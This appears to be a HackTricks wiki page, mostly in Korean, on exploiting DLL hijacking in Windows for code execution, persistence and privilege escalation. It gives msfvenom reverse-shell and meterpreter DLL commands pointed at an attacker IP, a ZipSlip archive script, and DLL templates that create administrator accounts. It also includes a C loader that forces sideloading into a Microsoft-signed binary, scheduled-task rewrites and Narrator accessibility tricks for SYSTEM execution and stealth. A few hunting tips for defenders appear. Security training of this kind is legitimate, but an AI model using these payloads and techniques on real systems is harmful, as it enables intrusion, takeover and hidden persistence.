# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 의미합니다. 이 용어에는 **DLL Spoofing, Injection, Side-Loading** 같은 여러 기법이 포함됩니다. 주로 code execution, persistence에 사용되며, 덜 흔하게 privilege escalation에도 사용됩니다. 여기서는 escalation에 초점을 두지만, hijacking 방식 자체는 목적과 무관하게 일관됩니다.

### Common Techniques

DLL hijacking에는 여러 방법이 사용되며, 각 방법의 효과는 애플리케이션의 DLL loading 전략에 따라 달라집니다:

1. **DLL Replacement**: 정상 DLL을 악성 DLL로 교체하며, 필요하면 DLL Proxying을 사용해 원본 DLL의 기능을 유지합니다.
2. **DLL Search Order Hijacking**: 검색 경로에서 합법적인 DLL보다 앞서는 위치에 악성 DLL을 두어, 애플리케이션의 search pattern을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 존재하지 않는 필수 DLL이라고 생각하도록 악성 DLL을 만들어 로드하게 합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일 같은 search parameters를 수정해 애플리케이션이 악성 DLL을 찾도록 유도합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 정상 DLL을 악성 DLL로 대체하는 방법으로, 보통 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자 제어 디렉터리에 악성 DLL을 두는 방식으로, Binary Proxy Execution 기법과 유사합니다.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading만이 신뢰된 **.NET Framework** 프로세스에 attacker code를 로드하게 만드는 유일한 방법은 아닙니다. 대상 실행 파일이 **managed** 애플리케이션이면, CLR은 실행 파일 이름을 딴 **application configuration file**도 확인합니다(예: `Setup.exe.config`). 이 파일은 사용자 정의 **AppDomainManager**를 정의할 수 있습니다. config가 EXE 옆에 놓인 attacker-controlled assembly를 가리키면, CLR은 이를 애플리케이션의 일반 code path **이전**에 로드하고 신뢰된 프로세스 안에서 실행합니다.

Microsoft의 .NET Framework configuration schema에 따르면, 사용자 정의 manager가 사용되려면 `<appDomainManagerAssembly>`와 `<appDomainManagerType>` 둘 다 있어야 합니다.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
최소 관리자:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
실용 참고사항:
- 이것은 **.NET Framework specific** 기법입니다. Win32 DLL search order가 아니라 CLR config parsing에 의존합니다.
- 호스트는 반드시 **managed EXE**여야 합니다. 빠른 triage: `sigcheck -m target.exe`, `corflags target.exe`, 또는 PE metadata에서 **CLR Runtime Header**를 확인하세요.
- config 파일명은 실행 파일 이름과 정확히 일치해야 하며 (`<binary>.config`), 보통 **EXE 옆**에 위치합니다.
- 이는 신뢰되는 EXE는 그대로 두고 악성 managed assembly가 in-process로 실행되기 때문에 **signed Microsoft/vendor binaries**와 함께 사용하면 유용합니다.
- 이미 writable installer/update directory가 있다면, AppDomainManager hijacking을 **first stage**로 사용하고, 이후 단계에서는 classic DLL sideloading 또는 reflective loading을 사용할 수 있습니다.

### 기존 scheduled task를 hijacking하여 sideload chain을 다시 실행하기

persistence를 위해 **새 task를 생성하는 것**만 보지 마세요. 일부 intrusion sets는 합법적인 installer가 **normal updater task**를 만들 때까지 기다렸다가, defenders가 익숙하게 보도록 기존의 name, author, trigger는 유지한 채 **task action을 rewrite**합니다.

재사용 가능한 workflow:
1. 합법적인 software를 설치/실행하고, 보통 생성하는 task를 식별합니다.
2. task XML을 export하고 현재 `<Exec><Command>` / `<Arguments>` 값을 확인합니다.
3. action만 바꿔서 task가 user-writable staging directory에 있는 **trusted host EXE**를 실행하게 하고, 그 EXE가 real payload를 side-load 또는 AppDomain-load 하도록 합니다.
4. 눈에 띄는 새 persistence artifact를 만들지 말고, 같은 task name을 다시 register합니다.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
왜 더 은밀한가:
- task name은 여전히 정상적으로 보일 수 있다(예: vendor updater).
- **Task Scheduler service**가 이를 실행하므로, parent/ancestor 검증은 종종 `explorer.exe` 대신 예상되는 scheduling chain을 본다.
- **새 task name**만 추적하는 DFIR 팀은, 등록은 이미 존재했지만 action이 이제 `%LOCALAPPDATA%`, `%APPDATA%` 또는 다른 attacker-controlled path를 가리키는 task를 놓칠 수 있다.

빠른 hunting pivot:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML과 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata를 baseline과 비교한다.
- **vendor-looking updater task**가 **user-writable directories**에서 실행되거나, 같은 위치에 있는 `*.config` 파일과 함께 .NET EXE를 실행할 때 alert한다.

> [!TIP]
> HTML staging, AES-CTR configs, 그리고 .NET implants를 DLL sideloading 위에 얹는 step-by-step chain은 아래 workflow를 참고하라.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls 찾기

시스템 안에서 Missing Dlls를 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, **다음 2개 필터를 설정**하는 것이다:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시한다:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

**일반적으로 missing dlls**를 찾고 있다면, 이것을 몇 **초** 동안 그대로 둔다.\
특정 executable 안의 **missing dll**을 찾고 있다면, **또 다른 필터를 설정**해야 한다. 예를 들면 "Process Name" "contains" `<exec name>`처럼 설정하고, 실행한 뒤, 이벤트 캡처를 중지한다.

## Missing Dlls 악용

privileges를 escalate하기 위해 우리가 가질 수 있는 최선의 기회는 privilege process가 로드하려 할 **dll을 write**할 수 있고, 그 dll이 **검색될 위치** 어딘가에 있어야 한다는 것이다. 따라서 우리는 **원래 dll**이 있는 폴더보다 **먼저 dll이 검색되는 폴더**에 dll을 **write**할 수 있거나(드문 경우), 또는 dll이 **검색될 어떤 폴더**에 write할 수 있고 원래 **dll**이 어떤 폴더에도 존재하지 않는 경우가 된다.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications**는 미리 정의된 **search paths** 집합을 따라 DLL을 찾으며, 특정 순서를 따른다. DLL hijacking 문제는 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되어, 정상 DLL보다 먼저 로드되도록 할 때 발생한다. 이를 방지하는 방법은 애플리케이션이 필요로 하는 DLL을 참조할 때 absolute paths를 사용하도록 하는 것이다.

아래에서 32-bit 시스템의 **DLL search order**를 볼 수 있다:

1. application이 로드된 디렉터리.
2. system directory. 이 디렉터리의 path는 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용해 얻는다.(_C:\Windows\System32_)
3. 16-bit system directory. 이 디렉터리의 path를 얻는 함수는 없지만, 검색은 수행된다. (_C:\Windows\System_)
4. Windows directory. 이 디렉터리의 path는 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용해 얻는다.
1. (_C:\Windows_)
5. current directory.
6. PATH environment variable에 나열된 디렉터리. 이때 **App Paths** registry key에 지정된 per-application path는 포함되지 않는다. **App Paths** key는 DLL search path를 계산할 때 사용되지 않는다.

이것이 **SafeDllSearchMode**가 활성화된 상태의 **default** search order이다. 비활성화되면 current directory가 두 번째로 올라간다. 이 기능을 끄려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value를 만들고 0으로 설정한다(default는 enabled).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면, search는 **LoadLibraryEx**가 로드하는 executable module의 directory에서 시작된다.

마지막으로, **dll could be loaded indicating the absolute path instead just the name**라는 점에 유의하라. 이 경우 해당 dll은 그 path에서만 검색된다(그 dll에 dependencies가 있다면, 그들은 이름만으로 로드된 것처럼 검색된다).

search order를 바꾸는 다른 방법도 있지만 여기서는 설명하지 않겠다.

### 임의 파일 쓰기를 missing-DLL hijack으로 연결하기

1. **ProcMon** filters(`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`)를 사용해 process가 찾지만 찾지 못하는 DLL name을 수집한다.
2. binary가 **schedule/service**에서 실행된다면, 그 이름 중 하나를 가진 DLL을 **application directory**(search-order entry #1)에 drop하면 다음 실행 시 로드된다. 한 .NET scanner 사례에서는 process가 실제 복사본을 `C:\Program Files\dotnet\fxr\...`에서 로드하기 전에 `C:\samples\app\`에서 `hostfxr.dll`을 찾고 있었다.
3. 임의 export가 있는 payload DLL(예: reverse shell)을 만든다: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive가 **ZipSlip-style arbitrary write**라면, extraction dir를 벗어나도록 ZIP entry를 만들어 DLL이 app folder에 떨어지게 한다:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 아카이브를 감시 중인 inbox/share로 전달하라; scheduled task가 프로세스를 다시 시작하면 malicious DLL을 로드하고 service account 권한으로 your code를 실행한다.

### RTL_USER_PROCESS_PARAMETERS.DllPath를 통해 sideloading 강제하기

새로 생성된 process의 DLL search path를 결정적으로 조작하는 고급 방법은 ntdll의 native APIs로 process를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것이다. 여기에 attacker-controlled directory를 제공하면, 이름만으로 imported DLL을 resolve하는 target process는 (absolute path가 없고 safe loading flags도 사용하지 않는 경우) 해당 디렉터리의 malicious DLL을 로드하도록 강제될 수 있다.

핵심 아이디어
- RtlCreateProcessParametersEx로 process parameters를 만들고, 네가 제어하는 folder(예: dropper/unpacker가 있는 directory)를 가리키는 custom DllPath를 제공한다.
- RtlCreateUserProcess로 process를 생성한다. target binary가 DLL을 이름으로 resolve할 때 loader는 resolution 과정에서 이 DllPath를 참조하므로, malicious DLL이 target EXE와 같은 위치에 없어도 reliable sideloading이 가능해진다.

Notes/limitations
- 이는 생성되는 child process에 적용되며, current process에만 영향을 주는 SetDllDirectory와는 다르다.
- target은 반드시 이름으로 DLL을 import하거나 LoadLibrary해야 한다 (absolute path가 없고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않아야 함).
- KnownDLLs와 hardcoded absolute paths는 hijack할 수 없다. Forwarded exports와 SxS는 precedence를 바꿀 수 있다.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 악성 xmllite.dll을 (필요한 함수를 export하거나 실제 DLL로 proxying하도록 해서) your DllPath 디렉터리에 배치합니다.
- 위 기술을 사용해 xmllite.dll을 이름으로 찾는 것으로 알려진 signed binary를 실행합니다. loader는 제공된 DllPath를 통해 import를 resolve하고, 당신의 DLL을 sideloads합니다.

이 기술은 실제 환경에서 multi-stage sideloading chains를 구동하는 데 사용된 것이 관찰되었습니다: 초기 launcher가 helper DLL을 드롭한 뒤, Microsoft-signed, hijack 가능한 binary를 custom DllPath와 함께 실행해 staging directory에서 attacker의 DLL을 강제로 로드합니다.


#### Exceptions on dll search order from Windows docs

Windows 문서에는 standard DLL search order에 대한 특정 exceptions가 언급되어 있습니다:

- 이미 memory에 로드된 것과 이름이 같은 **DLL**을 만나면, system은 일반적인 search를 건너뜁니다. 대신 redirection과 manifest를 확인한 뒤, memory에 이미 있는 DLL을 기본값으로 사용합니다. **이 시나리오에서는 system이 DLL에 대한 search를 수행하지 않습니다**.
- 해당 DLL이 현재 Windows 버전의 **known DLL**로 인식되면, system은 known DLL과 그 dependent DLL들을 포함한 해당 버전의 DLL을 사용하며, **search process를 생략합니다**. registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL 목록이 들어 있습니다.
- **DLL에 dependencies**가 있으면, 초기 DLL이 full path로 식별되었는지와 무관하게, 이 dependent DLL들에 대한 search는 마치 그것들이 **module names**만으로 지정된 것처럼 수행됩니다.

### Escalating Privileges

**Requirements**:

- **different privileges**로 동작하거나 동작할 process를 식별합니다(horizontal or lateral movement), 그리고 **DLL이 누락된** 상태여야 합니다.
- **DLL**이 **search**될 수 있는 모든 **directory**에 대해 **write access**가 가능해야 합니다. 이 위치는 executable의 디렉터리이거나 system path 내의 디렉터리일 수 있습니다.

Yeah, 요구 사항은 찾기 어렵습니다. 기본적으로 **privileged executable**이 **dll**을 누락한 경우를 찾는 것이 좀 이상하고, **system path** 폴더에 write permissions가 있는 것은 더 **이상합니다**(기본값으로는 불가능합니다). 하지만 misconfigured environments에서는 가능합니다.\
운 좋게도 요구 사항을 충족하는 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 볼 수 있습니다. 이 프로젝트의 **main goal은 UAC bypass**이지만, Windows 버전에 맞는 Dll hijaking의 **PoC**를 찾을 수 있으며, 이를 사용할 수 있습니다(아마도 write permissions가 있는 folder의 path만 바꾸면 됩니다).

폴더에서 **permissions**를 확인하려면 다음과 같이 할 수 있습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 안의 모든 폴더 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
실행 파일의 imports와 dll의 exports도 다음으로 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 안의 어떤 폴더에라도 write permissions가 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 automated tools는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 그리고 _Write-HijackDll._ 입니다.

### Example

exploitable scenario를 찾는 경우 성공적으로 exploit하기 위해 가장 중요한 것 중 하나는 **executable이 그 안에서 import할 모든 function을 최소한 export하는 dll을 만드는 것**입니다. 어쨌든, Dll Hijacking은 [**Medium Integrity level에서 High로 승격(**bypassing UAC**)](../../authentication-credentials-uac-and-efs/index.html#uac)하거나 [ **High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system)**.** 승격하는 데 유용합니다. **how to create a valid dll**의 예시는 execution을 위한 dll hijacking에 초점을 맞춘 이 dll hijacking study에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **next section**에서 **templates**로 유용할 수 있거나 **required functions가 export되지 않은 dll**을 만들 때 사용할 수 있는 몇 가지 **basic dll codes**를 찾을 수 있습니다.

## **Creating and compiling Dlls**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **your malicious code를 execute**할 수 있는 Dll이지만, 동시에 **real library로 모든 calls를 relaying**해서 **expose**하고 **work**하도록 **exected**되어 있습니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실제로 **indicate an executable and select the library**를 해서 **proxify**하려는 라이브러리를 선택하고 **proxified dll**을 생성하거나, **indicate the Dll**을 해서 **proxified dll**을 생성할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter(x86) 획득:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86, x64 버전은 보지 못했습니다):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

여러 경우에 컴파일하는 Dll은 피해 프로세스에 의해 로드될 **여러 함수들을 export**해야 합니다. 이러한 함수들이 존재하지 않으면 **binary**는 이를 로드할 수 없고 **exploit**은 실패하게 됩니다.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>사용자 생성이 포함된 C++ DLL 예제</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 엔트리 포인트가 있는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 여전히 예측 가능한 언어별 localization DLL을 조회하며, 이는 arbitrary code execution과 persistence에 악용될 수 있습니다.

핵심 사실
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path에 공격자가 제어하는 writable DLL이 있으면 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. exports는 필요하지 않습니다.

Procmon으로 탐지
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator를 시작하고 위 path 로드 시도를 관찰합니다.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naive hijack will speak/highlight UI. Quiet하게 유지하려면, attach 시 Narrator threads를 열거하고, main thread를 `OpenThread(THREAD_SUSPEND_RESUME)`로 연 뒤 `SuspendThread`로 중단한 다음 자신의 thread에서 계속 진행한다. 전체 코드는 PoC를 참조.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 planted DLL이 로드된다. secure desktop(logon screen)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면, DLL이 secure desktop에서 SYSTEM으로 실행된다.

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 대상 호스트에 RDP 접속 후, logon screen에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면, DLL이 secure desktop에서 SYSTEM으로 실행된다.
- RDP session이 닫히면 execution이 중단된다—즉시 inject/migrate해야 한다.

Bring Your Own Accessibility (BYOA)
- 내장 Accessibility Tool (AT) registry entry(예: CursorIndicator)를 복제해 임의의 binary/DLL을 가리키도록 수정한 뒤 import하고, `configuration`을 해당 AT 이름으로 설정할 수 있다. 이렇게 하면 Accessibility framework 아래에서 arbitrary execution을 프록시할 수 있다.

Notes
- `%windir%\System32` 아래에 쓰고 HKLM 값을 변경하려면 admin rights가 필요하다.
- 모든 payload logic은 `DLL_PROCESS_ATTACH`에 넣을 수 있으며, exports는 필요 없다.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu(`TPQMAssistant.exe`)에서의 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적된다.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 drop한다.
2. 예약된 작업이 오전 9:30에 현재 사용자 컨텍스트에서 실행되기를 기다린다.
3. 작업이 실행될 때 administrator가 로그인되어 있으면, malicious DLL이 administrator의 session에서 medium integrity로 실행된다.
4. standard UAC bypass techniques를 체인하여 medium integrity에서 SYSTEM privileges로 elevate한다.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors는 신뢰할 수 있는 signed process 아래에서 payload를 실행하기 위해 MSI-based droppers와 DLL side-loading을 자주 함께 사용한다.

Chain overview
- User가 MSI를 다운로드한다. GUI install 중 CustomAction이 조용히 실행되어(e.g., LaunchApplication 또는 VBScript action), embedded resources에서 다음 stage를 복원한다.
- dropper는 legitimate, signed EXE와 malicious DLL을 같은 directory에 쓴다(example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- signed EXE가 시작되면, Windows DLL search order가 working directory에서 wsc.dll을 먼저 로드하여, attacker code를 signed parent 아래에서 실행한다(ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- executables 또는 VBScript를 실행하는 entry를 찾는다. suspicious pattern 예시: embedded file를 background에서 실행하는 LaunchApplication.
- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence, Binary tables를 확인한다.
- MSI CAB의 embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 concatenate되고 decrypted되는 여러 개의 작은 fragment를 찾는다. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 이 두 파일을 같은 폴더에 넣습니다:
- wsc_proxy.exe: 합법적인 signed host (Avast). 이 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: attacker DLL. 특정 exports가 필요하지 않다면 DllMain만으로 충분합니다; 그렇지 않으면 proxy DLL을 만들고 필요한 exports를 실제 라이브러리로 forward하면서 DllMain에서 payload를 실행합니다.
- 최소한의 DLL payload를 빌드합니다:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
